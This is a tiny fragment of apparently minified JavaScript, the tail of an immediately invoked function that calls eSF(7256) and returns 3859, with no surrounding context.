);eSF(7256);return 3859})()
